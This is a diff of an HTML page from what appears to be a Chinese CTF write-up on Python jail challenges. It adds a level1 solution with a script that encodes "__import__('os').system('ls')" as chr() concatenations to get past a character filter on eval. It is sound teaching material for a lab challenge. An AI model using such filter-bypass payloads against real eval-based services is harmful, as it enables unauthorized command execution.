@@ -212,12 +212,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/python/" style="color: #00a596">python</a>
+                <a href="/blog/tags/python/" style="color: #ffa2c4">python</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/jail/" style="color: #00a596">jail</a>
+                <a href="/blog/tags/jail/" style="color: #03a9f4">jail</a>
             </span>
             
         </span>
@@ -261,7 +261,10 @@ input_data <span class="token operator">=</span> <span class="token builtin">inp
 
 <p><img src="/blog/2023/06/07/python-jail/image-20230607115540253.png" alt="image-20230607115540253"></p>
 <hr>
-<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>跟上题比起来多加了过滤</p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2910">level1</a></h2><blockquote>
+<p>chr()</p>
+</blockquote>
+<p>跟上题比起来多加了过滤</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
     not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'"\'`ib'</span><span class="token punctuation">)</span>
     <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>
@@ -272,6 +275,22 @@ input_data <span class="token operator">=</span> <span class="token builtin">inp
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>能通过<code>eval</code>执行任意命令，但是命令不能包含双引号、单引号、反引号、字母<code>i</code>和字母<code>b</code></p>
+<p>这个时候可以考虑用字符编码来进行绕过</p>
+<p>附上生成脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 原始字符串</span>
+character <span class="token operator">=</span> <span class="token string">"__import__('os').system('ls')"</span>
+
+<span class="token comment"># 获取字符串的 ASCII 码值，并转换为对应的字符</span>
+ascii_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> character<span class="token punctuation">]</span>
+
+<span class="token comment"># 输出结果，拼接成 "chr()+chr()+..." 的形式</span>
+ascii_str <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> character<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"对应的字符为 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>ascii_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>之后和上题一样传入即可</p>
+<p>注意要带上<code>eval()</code>，才能进行命令执行，否则只是输出拼接结果</p>
+<p><img src="/blog/2023/06/07/python-jail/image-20230607201257446.png" alt="image-20230607201257446"></p>
 
     </div>
     
